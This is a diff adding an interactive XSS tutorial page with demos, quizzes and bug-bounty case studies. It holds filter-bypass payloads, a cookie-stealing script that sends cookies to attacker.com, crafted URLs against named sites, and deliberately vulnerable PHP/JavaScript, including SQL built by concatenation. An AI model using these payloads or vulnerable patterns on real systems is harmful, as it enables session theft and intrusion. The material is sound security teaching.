+                      fill-rule="evenodd"
+                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z"
+                      clip-rule="evenodd"
+                    />
+                  </svg>
+                </div>
+                <div class="ml-3">
+                  <p class="text-sm text-blue-700">
+                    <strong>Expert Tip:</strong> When testing for XSS
+                    vulnerabilities, try multiple payload variations. Websites
+                    often implement partial input sanitization that can be
+                    bypassed with creative encoding or script techniques.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Reflected XSS Section -->
+        <section
+          id="reflected-xss"
+          class="bg-white rounded-lg shadow-md p-6 mb-8"
+        >
+          <div
+            class="section-header flex justify-between items-center cursor-pointer"
+            onclick="toggleSection('reflected-content')"
+          >
+            <h2 class="text-2xl font-bold text-blue-600">2.1 Reflected XSS</h2>
+            <svg
+              class="w-6 h-6 text-blue-500 transform transition-transform"
+              id="reflected-icon"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M19 9l-7 7-7-7"
+              />
+            </svg>
+          </div>
+          <div id="reflected-content" class="section-content active mt-4">
+            <p class="mb-4">
+              Reflected XSS is the most common type of Cross-Site Scripting. In
+              a reflected XSS attack, the malicious script is reflected off the
+              web server, such as in an error message, search result, or any
+              other response that includes some or all of the input sent to the
+              server as part of the request.
+            </p>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              How Reflected XSS Works
+            </h3>
+
+            <div class="flex flex-col md:flex-row gap-6 mb-6">
+              <div class="md:w-1/2">
+                <ol class="list-decimal pl-6 space-y-2">
+                  <li>
+                    An attacker identifies a vulnerable website that reflects
+                    user input without proper sanitization
+                  </li>
+                  <li>
+                    The attacker crafts a malicious URL that includes JavaScript
+                    code as a parameter
+                  </li>
+                  <li>
+                    The attacker sends this URL to potential victims (via email,
+                    message, etc.)
+                  </li>
+                  <li>
+                    When a victim clicks the link, their browser sends the
+                    request to the vulnerable server
+                  </li>
+                  <li>
+                    The server includes the malicious script in its response
+                  </li>
+                  <li>
+                    The victim's browser executes the script as if it came from
+                    the trusted website
+                  </li>
+                </ol>
+              </div>
+              <div class="md:w-1/2 bg-gray-100 p-4 rounded-lg">
+                <h4 class="font-semibold mb-2">Vulnerable PHP Code Example</h4>
+                <div class="code-block bg-gray-800 rounded-md">
+                  <button
+                    class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                    onclick="copyCode(this)"
+                  >
+                    Copy
+                  </button>
+                  <pre><code class="language-html">&lt;?php
+// Vulnerable search page
+$search = $_GET['query'];
+echo "&lt;h2&gt;Search results for: " . $search . "&lt;/h2&gt;";
+// Rest of the search functionality
+?&gt;</code></pre>
+                </div>
+                <p class="text-sm mt-2">
+                  This code directly outputs the search query parameter without
+                  any sanitization.
+                </p>
+              </div>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Common Attack Vectors
+            </h3>
+            <ul class="list-disc pl-6 mb-4 space-y-2">
+              <li>
+                <strong>URL Parameters:</strong>
+                <code
+                  >https://example.com/search?query=&lt;script&gt;alert('XSS')&lt;/script&gt;</code
+                >
+              </li>
+              <li>
+                <strong>Form Fields:</strong> Submitting scripts via search,
+                login, or feedback forms
+              </li>
+              <li>
+                <strong>HTTP Headers:</strong> Some applications reflect HTTP
+                headers like User-Agent in their responses
+              </li>
+              <li>
+                <strong>Error Messages:</strong> Applications that display error
+                messages containing user input
+              </li>
+            </ul>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Interactive Demo: Reflected XSS
+            </h3>
+            <div class="bg-gray-100 p-6 rounded-lg mb-6">
+              <div class="mb-4">
+                <h4 class="font-semibold mb-2">
+                  Step 1: Enter a search query in our vulnerable search
+                  application
+                </h4>
+                <div class="flex">
+                  <input
+                    type="text"
+                    id="reflected-search"
+                    class="flex-grow p-2 border rounded-l"
+                    placeholder="Enter search term"
+                  />
+                  <button
+                    onclick="reflectedXSSDemo()"
+                    class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-r"
+                  >
+                    Search
+                  </button>
+                </div>
+              </div>
+
+              <div class="mt-4">
+                <h4 class="font-semibold mb-2">Results:</h4>
+                <div
+                  id="reflected-result"
+                  class="p-4 bg-white border rounded-md min-h-[100px]"
+                >
+                  <p class="text-gray-500">
+                    Search results will appear here...
+                  </p>
+                </div>
+              </div>
+
+              <div class="mt-4">
+                <p class="text-sm text-gray-600">
+                  Try entering a basic XSS payload like
+                  <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code> to see
+                  how reflected XSS works.
+                </p>
+              </div>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Real-world Example: Reflected XSS in Search Functionality
+            </h3>
+            <div class="bg-gray-50 p-4 rounded-lg mb-6">
+              <p class="mb-2">
+                In 2018, a security researcher found a reflected XSS
+                vulnerability in Google's custom search engine. When a search
+                was performed, the query parameter was reflected in the page
+                without proper encoding, allowing attackers to execute
+                JavaScript.
+              </p>
+              <p class="mb-0">The vulnerable URL looked something like:</p>
+              <div class="code-block bg-gray-800 rounded-md mt-2">
+                <button
+                  class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                  onclick="copyCode(this)"
+                >
+                  Copy
+                </button>
+                <pre><code class="language-html">https://www.google.com/custom?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+              </div>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Advanced Reflected XSS Techniques
+            </h3>
+            <div class="mb-6">
+              <h4 class="font-semibold text-blue-600 mb-2">
+                Filter Bypass Techniques
+              </h4>
+              <div class="code-block bg-gray-800 rounded-md mb-3">
+                <button
+                  class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                  onclick="copyCode(this)"
+                >
+                  Copy
+                </button>
+                <pre><code class="language-html">// Using different event handlers
+&lt;img src="x" onerror="alert('XSS')"&gt;
+
+// Using HTML encoding
+&lt;img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"&gt;
+
+// Using JavaScript encoding
+&lt;script&gt;\u0061\u006c\u0065\u0072\u0074('XSS')&lt;/script&gt;
+
+// Using data URI
+&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="&gt;</code></pre>
+              </div>
+            </div>
+
+            <div
+              class="mt-6 p-4 bg-green-50 border border-green-200 rounded-md"
+            >
+              <h3 class="text-lg font-semibold text-green-800 mb-2">
+                Knowledge Check
+              </h3>
+              <p class="mb-3">
+                In a reflected XSS attack, where is the malicious code stored?
+              </p>
+              <div class="space-y-2">
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz2" id="q2o1" value="wrong" />
+                  <label for="q2o1" class="ml-2"
+                    >In the website's database</label
+                  >
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz2" id="q2o2" value="correct" />
+                  <label for="q2o2" class="ml-2"
+                    >It is not stored; it's included in the request (like a URL)
+                    and reflected back in the response</label
+                  >
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz2" id="q2o3" value="wrong" />
+                  <label for="q2o3" class="ml-2"
+                    >In the victim's browser cache</label
+                  >
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz2" id="q2o4" value="wrong" />
+                  <label for="q2o4" class="ml-2"
+                    >In a temporary file on the web server</label
+                  >
+                </div>
+              </div>
+              <button
+                onclick="checkAnswer('quiz2')"
+                class="mt-3 bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded"
+              >
+                Check Answer
+              </button>
+              <p id="quiz2-feedback" class="mt-2 hidden"></p>
+            </div>
+          </div>
+        </section>
+
+        <!-- Stored XSS Section -->
+        <section id="stored-xss" class="bg-white rounded-lg shadow-md p-6 mb-8">
+          <div
+            class="section-header flex justify-between items-center cursor-pointer"
+            onclick="toggleSection('stored-content')"
+          >
+            <h2 class="text-2xl font-bold text-blue-600">2.2 Stored XSS</h2>
+            <svg
+              class="w-6 h-6 text-blue-500 transform transition-transform"
+              id="stored-icon"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M19 9l-7 7-7-7"
+              />
+            </svg>
+          </div>
+          <div id="stored-content" class="section-content active mt-4">
+            <p class="mb-4">
+              Stored XSS (also known as persistent XSS) is considered the most
+              dangerous type of XSS. In this attack, the malicious script is
+              stored permanently on the target server, such as in a database,
+              forum post, comment field, or visitor log.
+            </p>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              How Stored XSS Works
+            </h3>
+
+            <div class="flex flex-col md:flex-row gap-6 mb-6">
+              <div class="md:w-1/2">
+                <ol class="list-decimal pl-6 space-y-2">
+                  <li>
+                    An attacker identifies a website that stores user input
+                    without proper sanitization
+                  </li>
+                  <li>
+                    The attacker submits a malicious script via a form that
+                    stores data (comment, review, etc.)
+                  </li>
+                  <li>
+                    The website stores the malicious script in its database
+                  </li>
+                  <li>
+                    When other users view the page containing the stored script,
+                    it's served as part of the website's content
+                  </li>
+                  <li>
+                    The victims' browsers execute the script as if it came from
+                    the trusted website
+                  </li>
+                  <li>
+                    The attack affects every visitor that views the infected
+                    page
+                  </li>
+                </ol>
+              </div>
+              <div class="md:w-1/2 bg-gray-100 p-4 rounded-lg">
+                <h4 class="font-semibold mb-2">
+                  Vulnerable Comment System Code
+                </h4>
+                <div class="code-block bg-gray-800 rounded-md">
+                  <button
+                    class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                    onclick="copyCode(this)"
+                  >
+                    Copy
+                  </button>
+                  <pre><code class="language-html">&lt;?php
+// Store the comment in the database
+$comment = $_POST['comment'];
+$query = "INSERT INTO comments (comment_text) VALUES ('$comment')";
+$db->query($query);
+
+// Display comments (vulnerable code)
+$result = $db->query("SELECT * FROM comments");
+while ($row = $result->fetch_assoc()) {
+    echo "&lt;div class='comment'&gt;" . $row['comment_text'] . "&lt;/div&gt;";
+}
+?&gt;</code></pre>
+                </div>
+                <p class="text-sm mt-2">
+                  This code stores and displays user comments without any
+                  sanitization.
+                </p>
+              </div>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Common Attack Vectors
+            </h3>
+            <ul class="list-disc pl-6 mb-4 space-y-2">
+              <li>
+                <strong>Comment Systems:</strong> Blog comments, forum posts,
+                product reviews
+              </li>
+              <li>
+                <strong>User Profiles:</strong> Profile information, status
+                updates, signatures
+              </li>
+              <li>
+                <strong>Message Boards:</strong> Public or private messages
+                between users
+              </li>
+              <li>
+                <strong>Support Tickets:</strong> Customer service requests that
+                are viewed by staff
+              </li>
+              <li>
+                <strong>Contact Forms:</strong> If submissions are stored and
+                displayed to administrators
+              </li>
+            </ul>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Interactive Demo: Stored XSS
+            </h3>
+            <div class="bg-gray-100 p-6 rounded-lg mb-6">
+              <div class="mb-4">
+                <h4 class="font-semibold mb-2">
+                  Step 1: Leave a comment on our vulnerable blog
+                </h4>
+                <textarea
+                  id="stored-comment"
+                  class="w-full p-2 border rounded"
+                  rows="3"
+                  placeholder="Write your comment here"
+                ></textarea>
+                <button
+                  onclick="storedXSSDemo()"
+                  class="mt-2 bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded"
+                >
+                  Post Comment
+                </button>
+              </div>
+
+              <div class="mt-4">
+                <h4 class="font-semibold mb-2">Comments Section:</h4>
+                <div
+                  id="comments-section"
+                  class="p-4 bg-white border rounded-md"
+                >
+                  <div class="comment p-2 border-b">
+                    <strong>Jane Doe:</strong> This is a great article! Thanks
+                    for sharing.
+                  </div>
+                  <div class="comment p-2 border-b">
+                    <strong>John Smith:</strong> I learned a lot from this. Very
+                    informative.
+                  </div>
+                  <!-- New comments will appear here -->
+                </div>
+              </div>
+
+              <div class="mt-4">
+                <p class="text-sm text-gray-600">
+                  Try posting a comment with a basic XSS payload like
+                  <code>&lt;script&gt;alert('Stored XSS');&lt;/script&gt;</code>
+                  to see how stored XSS works. Notice how the script executes
+                  whenever the comments section is viewed.
+                </p>
+              </div>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Real-world Example: Stored XSS in Social Media
+            </h3>
+            <div class="bg-gray-50 p-4 rounded-lg mb-6">
+              <p class="mb-2">
+                In 2014, a security researcher discovered a stored XSS
+                vulnerability in Twitter that allowed attackers to embed
+                JavaScript in tweets. When users viewed these tweets, the
+                malicious code would execute.
+              </p>
+              <p>
+                The vulnerability was found in Twitter's TweetDeck application,
+                which didn't properly sanitize tweet content. A simple tweet
+                containing
+                <code
+                  >&lt;script class="xss"&gt;alert("XSS")&lt;/script&gt;</code
+                >
+                was automatically retweeted thousands of times as users viewed
+                the infected tweet.
+              </p>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Cookie Stealing Payload Example
+            </h3>
+            <div class="code-block bg-gray-800 rounded-md mb-4">
+              <button
+                class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                onclick="copyCode(this)"
+              >
+                Copy
+              </button>
+              <pre><code class="language-html">&lt;script&gt;
+  // Create an image element with source pointing to attacker's server
+  // with the document.cookie as a URL parameter
+  var img = new Image();
+  img.src = 'https://attacker.com/steal.php?cookie=' + document.cookie;
+  document.body.appendChild(img);
+&lt;/script&gt;</code></pre>
+            </div>
+            <p class="text-sm text-gray-600 mb-6">
+              This payload creates an invisible image that sends the victim's
+              cookies to the attacker's server. The attacker can then use these
+              cookies to hijack the victim's session.
+            </p>
+
+            <div
+              class="mt-6 p-4 bg-green-50 border border-green-200 rounded-md"
+            >
+              <h3 class="text-lg font-semibold text-green-800 mb-2">
+                Knowledge Check
+              </h3>
+              <p class="mb-3">
+                Why is stored XSS generally considered more dangerous than
+                reflected XSS?
+              </p>
+              <div class="space-y-2">
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz3" id="q3o1" value="wrong" />
+                  <label for="q3o1" class="ml-2"
+                    >It's harder to detect by security tools</label
+                  >
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz3" id="q3o2" value="wrong" />
+                  <label for="q3o2" class="ml-2"
+                    >The code executes faster in the browser</label
+                  >
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz3" id="q3o3" value="correct" />
+                  <label for="q3o3" class="ml-2"
+                    >It affects all users who view the infected page without
+                    requiring them to click a malicious link</label
+                  >
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz3" id="q3o4" value="wrong" />
+                  <label for="q3o4" class="ml-2"
+                    >It can only be found in older web applications</label
+                  >
+                </div>
+              </div>
+              <button
+                onclick="checkAnswer('quiz3')"
+                class="mt-3 bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded"
+              >
+                Check Answer
+              </button>
+              <p id="quiz3-feedback" class="mt-2 hidden"></p>
+            </div>
+          </div>
+        </section>
+
+        <!-- DOM-based XSS Section -->
+        <section id="dom-xss" class="bg-white rounded-lg shadow-md p-6 mb-8">
+          <div
+            class="section-header flex justify-between items-center cursor-pointer"
+            onclick="toggleSection('dom-content')"
+          >
+            <h2 class="text-2xl font-bold text-blue-600">2.3 DOM-based XSS</h2>
+            <svg
+              class="w-6 h-6 text-blue-500 transform transition-transform"
+              id="dom-icon"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M19 9l-7 7-7-7"
+              />
+            </svg>
+          </div>
+          <div id="dom-content" class="section-content active mt-4">
+            <p class="mb-4">
+              DOM-based XSS is a type of Cross-Site Scripting attack where the
+              vulnerability exists in client-side code rather than server-side
+              code. The attack payload is executed as a result of modifying the
+              DOM environment in the victim's browser.
+            </p>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              How DOM-based XSS Works
+            </h3>
+
+            <div class="flex flex-col md:flex-row gap-6 mb-6">
+              <div class="md:w-1/2">
+                <ol class="list-decimal pl-6 space-y-2">
+                  <li>
+                    An attacker identifies a website with vulnerable client-side
+                    JavaScript
+                  </li>
+                  <li>
+                    The attacker creates a malicious URL with a payload that
+                    targets DOM manipulation
+                  </li>
+                  <li>
+                    When a victim visits the URL, the page's JavaScript code
+                    runs
+                  </li>
+                  <li>
+                    The vulnerable JavaScript takes data from the URL (like
+                    fragment or query parameters)
+                  </li>
+                  <li>
+                    This data is used to dynamically update the DOM without
+                    proper sanitization
+                  </li>
+                  <li>
+                    The malicious script is inserted into the DOM and executed
+                    in the victim's browser
+                  </li>
+                </ol>
+              </div>
+              <div class="md:w-1/2 bg-gray-100 p-4 rounded-lg">
+                <h4 class="font-semibold mb-2">Vulnerable JavaScript Code</h4>
+                <div class="code-block bg-gray-800 rounded-md">
+                  <button
+                    class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                    onclick="copyCode(this)"
+                  >
+                    Copy
+                  </button>
+                  <pre><code class="language-html">&lt;script&gt;
+// Get the value of the 'name' parameter from URL
+var name = document.location.href.split('name=')[1];
+
+// Vulnerable code that inserts the parameter into the DOM
+document.getElementById('greeting').innerHTML = 'Hello, ' + name + '!';
+&lt;/script&gt;</code></pre>
+                </div>
+                <p class="text-sm mt-2">
+                  This code takes a parameter from the URL and inserts it
+                  directly into the DOM without sanitization.
+                </p>
+              </div>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Common DOM Sources and Sinks
+            </h3>
+
+            <div class="mb-6">
+              <h4 class="font-semibold text-blue-600 mb-2">
+                DOM Sources (Where attacker-controlled data comes from)
+              </h4>
+              <ul class="list-disc pl-6 space-y-1">
+                <li><code>document.URL</code></li>
+                <li><code>document.location</code> and all its properties</li>
+                <li><code>document.referrer</code></li>
+                <li><code>window.name</code></li>
+                <li><code>history.pushState()</code></li>
+                <li>URL parameters and fragments</li>
+                <li>
+                  Web Storage (<code>localStorage</code>,
+                  <code>sessionStorage</code>)
+                </li>
+              </ul>
+            </div>
+
+            <div class="mb-6">
+              <h4 class="font-semibold text-blue-600 mb-2">
+                DOM Sinks (Vulnerable methods that can execute or insert HTML)
+              </h4>
+              <ul class="list-disc pl-6 space-y-1">
+                <li><code>document.write()</code></li>
+                <li><code>element.innerHTML</code></li>
+                <li><code>element.outerHTML</code></li>
+                <li><code>element.insertAdjacentHTML</code></li>
+                <li><code>eval()</code></li>
+                <li>
+                  <code>setTimeout()</code> / <code>setInterval()</code> with
+                  string parameters
+                </li>
+                <li><code>location</code> object properties</li>
+                <li>jQuery functions like <code>$('selector').html()</code></li>
+              </ul>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Interactive Demo: DOM-based XSS
+            </h3>
+            <div class="bg-gray-100 p-6 rounded-lg mb-6">
+              <div class="mb-4">
+                <h4 class="font-semibold mb-2">
+                  A simple page that greets users by name:
+                </h4>
+                <div class="p-4 bg-white border rounded-md">
+                  <h3 class="mb-4">Welcome to our Website</h3>
+                  <div id="greeting-output">Hello, Guest!</div>
+                  <div class="mt-4">
+                    <label for="name-input" class="block mb-1"
+                      >Enter your name:</label
+                    >
+                    <div class="flex">
+                      <input
+                        type="text"
+                        id="name-input"
+                        class="flex-grow p-2 border rounded-l"
+                        placeholder="Your name"
+                      />
+                      <button
+                        onclick="domXSSDemo()"
+                        class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-r"
+                      >
+                        Update
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="mt-4">
+                <p class="text-sm text-gray-600">
+                  Try entering a DOM XSS payload like
+                  <code>&lt;img src="x" onerror="alert('DOM XSS')"&gt;</code> to
+                  see how DOM-based XSS works.
+                </p>
+                <p class="text-sm text-gray-600 mt-2">
+                  The vulnerable code that updates the greeting looks like this:
+                </p>
+                <div class="code-block bg-gray-800 rounded-md mt-1">
+                  <button
+                    class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                    onclick="copyCode(this)"
+                  >
+                    Copy
+                  </button>
+                  <pre><code class="language-html">// Vulnerable function used in our demo
+function domXSSDemo() {
+  var name = document.getElementById('name-input').value;
+  document.getElementById('greeting-output').innerHTML = 'Hello, ' + name + '!';
+}</code></pre>
+                </div>
+              </div>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Real-world Example: DOM-based XSS in Popular Frameworks
+            </h3>
+            <div class="bg-gray-50 p-4 rounded-lg mb-6">
+              <p class="mb-2">
+                In 2019, a security researcher found a DOM-based XSS
+                vulnerability in React Router, a popular routing library for
+                React applications. The vulnerability was in the way React
+                Router handled URL parameters, which could be exploited to
+                inject malicious JavaScript.
+              </p>
+              <p>
+                When React Router parsed URL parameters, it would directly
+                insert them into the DOM without proper sanitization. An
+                attacker could craft a URL that contained malicious code, and
+                when a victim visited that URL, the code would execute in their
+                browser.
+              </p>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Advanced DOM XSS Techniques
+            </h3>
+            <div class="code-block bg-gray-800 rounded-md mb-4">
+              <button
+                class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                onclick="copyCode(this)"
+              >
+                Copy
+              </button>
+              <pre><code class="language-html">// Using URL fragments
+https://example.com/page#&lt;img src="x" onerror="alert(1)"&gt;
+
+// Using javascript: protocol
+&lt;a href="javascript:alert(1)"&gt;Click me&lt;/a&gt;
+
+// Using event handlers with encoded values
+&lt;a onmouseover="alert(String.fromCharCode(88,83,83))"&gt;Hover over me&lt;/a&gt;
+
+// Exploiting jQuery's $(selector) function
+https://example.com/page#&lt;div id="$(alert(1))"&gt;</code></pre>
+            </div>
+
+            <div
+              class="mt-6 p-4 bg-green-50 border border-green-200 rounded-md"
+            >
+              <h3 class="text-lg font-semibold text-green-800 mb-2">
+                Knowledge Check
+              </h3>
+              <p class="mb-3">
+                What is unique about DOM-based XSS compared to Reflected and
+                Stored XSS?
+              </p>
+              <div class="space-y-2">
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz4" id="q4o1" value="wrong" />
+                  <label for="q4o1" class="ml-2"
+                    >DOM-based XSS only affects older browsers</label
+                  >
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz4" id="q4o2" value="correct" />
+                  <label for="q4o2" class="ml-2"
+                    >DOM-based XSS occurs entirely on the client-side and
+                    doesn't require the payload to be processed by the
+                    server</label
+                  >
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz4" id="q4o3" value="wrong" />
+                  <label for="q4o3" class="ml-2"
+                    >DOM-based XSS can only be exploited by authenticated
+                    users</label
+                  >
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz4" id="q4o4" value="wrong" />
+                  <label for="q4o4" class="ml-2"
+                    >DOM-based XSS requires physical access to the server</label
+                  >
+                </div>
+              </div>
+              <button
+                onclick="checkAnswer('quiz4')"
+                class="mt-3 bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded"
+              >
+                Check Answer
+              </button>
+              <p id="quiz4-feedback" class="mt-2 hidden"></p>
+            </div>
+          </div>
+        </section>
+
+        <!-- Real-World Bug Bounty Scenarios Section -->
+        <section id="real-world" class="bg-white rounded-lg shadow-md p-6 mb-8">
+          <div
+            class="section-header flex justify-between items-center cursor-pointer"
+            onclick="toggleSection('real-world-content')"
+          >
+            <h2 class="text-2xl font-bold text-blue-600">
+              3. Real-World Bug Bounty Scenarios
+            </h2>
+            <svg
+              class="w-6 h-6 text-blue-500 transform transition-transform"
+              id="real-world-icon"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M19 9l-7 7-7-7"
+              />
+            </svg>
+          </div>
+          <div id="real-world-content" class="section-content active mt-4">
+            <p class="mb-4">
+              Understanding real-world XSS vulnerabilities can provide valuable
+              insights into how these attacks are discovered and exploited in
+              the wild. Let's examine some notable bug bounty reports involving
+              XSS vulnerabilities.
+            </p>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Case Study 1: XSS in Google Search
+              </h3>
+              <div class="bg-gray-50 p-4 rounded-lg">
+                <h4 class="font-semibold text-blue-600 mb-2">
+                  Vulnerability Details
+                </h4>
+                <ul class="list-disc pl-6 mb-4 space-y-1">
+                  <li><strong>Type:</strong> Reflected XSS</li>
+                  <li><strong>Discovery Date:</strong> 2019</li>
+                  <li><strong>Bounty:</strong> $5,000</li>
+                </ul>
+
+                <h4 class="font-semibold text-blue-600 mb-2">Description</h4>
+                <p class="mb-4">
+                  A security researcher discovered a reflected XSS vulnerability
+                  in Google's custom search implementation. The vulnerability
+                  was found in the error page that appeared when no results were
+                  found for a search query.
+                </p>
+
+                <h4 class="font-semibold text-blue-600 mb-2">Exploit</h4>
+                <p class="mb-2">
+                  The researcher noticed that when searching for specific terms
+                  with no results, the error message would include the search
+                  term without proper sanitization. By crafting a search query
+                  with embedded JavaScript, they could execute code in the
+                  context of Google's domain.
+                </p>
+
+                <div class="code-block bg-gray-800 rounded-md mb-4">
+                  <button
+                    class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                    onclick="copyCode(this)"
+                  >
+                    Copy
+                  </button>
+                  <pre><code class="language-html">https://www.google.com/custom?q=&lt;svg/onload=alert(document.domain)&gt;&site=default_collection</code></pre>
+                </div>
+
+                <h4 class="font-semibold text-blue-600 mb-2">Impact</h4>
+                <p>
+                  This vulnerability could have been used to steal Google
+                  account cookies, leading to account takeover. Additionally,
+                  given Google's trusted domain, phishing attacks launched from
+                  this domain would have been particularly effective.
+                </p>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Case Study 2: Stored XSS in Twitter
+              </h3>
+              <div class="bg-gray-50 p-4 rounded-lg">
+                <h4 class="font-semibold text-blue-600 mb-2">
+                  Vulnerability Details
+                </h4>
+                <ul class="list-disc pl-6 mb-4 space-y-1">
+                  <li><strong>Type:</strong> Stored XSS</li>
+                  <li><strong>Discovery Date:</strong> 2014</li>
+                  <li><strong>Bounty:</strong> Not disclosed</li>
+                </ul>
+
+                <h4 class="font-semibold text-blue-600 mb-2">Description</h4>
+                <p class="mb-4">
+                  A significant stored XSS vulnerability was discovered in
+                  Twitter's TweetDeck client. The vulnerability allowed
+                  attackers to embed JavaScript in tweets, which would then
+                  execute when viewed by other users.
+                </p>
+
+                <h4 class="font-semibold text-blue-600 mb-2">Exploit</h4>
+                <p class="mb-2">
+                  The researcher found that TweetDeck wasn't properly sanitizing
+                  tweet content. By including HTML and JavaScript in a tweet,
+                  they could execute arbitrary code in the context of Twitter's
+                  domain.
+                </p>
+
+                <div class="code-block bg-gray-800 rounded-md mb-4">
+                  <button
+                    class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                    onclick="copyCode(this)"
+                  >
+                    Copy
+                  </button>
+                  <pre><code class="language-html">&lt;script class="xss"&gt;alert("XSS in TweetDeck")&lt;/script&gt;♥</code></pre>
+                </div>
+
+                <h4 class="font-semibold text-blue-600 mb-2">Impact</h4>
+                <p>
+                  This vulnerability quickly spread as the payload included code
+                  to automatically retweet itself. Within hours, thousands of
+                  users had unwittingly retweeted the malicious content,
+                  demonstrating the viral nature of stored XSS attacks.
+                </p>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Case Study 3: DOM-based XSS in PayPal
+              </h3>
+              <div class="bg-gray-50 p-4 rounded-lg">
+                <h4 class="font-semibold text-blue-600 mb-2">
+                  Vulnerability Details
+                </h4>
+                <ul class="list-disc pl-6 mb-4 space-y-1">
+                  <li><strong>Type:</strong> DOM-based XSS</li>
+                  <li><strong>Discovery Date:</strong> 2017</li>
+                  <li><strong>Bounty:</strong> $5,500</li>
+                </ul>
+
+                <h4 class="font-semibold text-blue-600 mb-2">Description</h4>
+                <p class="mb-4">
+                  A security researcher discovered a DOM-based XSS vulnerability
+                  in PayPal's main site. The vulnerability existed in
+                  client-side JavaScript code that handled URL parameters
+                  without proper sanitization.
+                </p>
+
+                <h4 class="font-semibold text-blue-600 mb-2">Exploit</h4>
+                <p class="mb-2">
+                  The researcher found that JavaScript on PayPal's website was
+                  taking values from the URL and directly inserting them into
+                  the DOM. By crafting a special URL with a malicious payload,
+                  they could execute JavaScript in the context of PayPal's
+                  domain.
+                </p>
+
+                <div class="code-block bg-gray-800 rounded-md mb-4">
+                  <button
+                    class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                    onclick="copyCode(this)"
+                  >
+                    Copy
+                  </button>
+                  <pre><code class="language-html">https://www.paypal.com/signin/?returnUrl=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+</code></pre>
+                </div>
+
+                <h4 class="font-semibold text-blue-600 mb-2">Impact</h4>
+                <p>
+                  This vulnerability could have been used to create convincing
+                  phishing pages, steal session tokens, or perform unauthorized
+                  actions on behalf of PayPal users. Given PayPal's financial
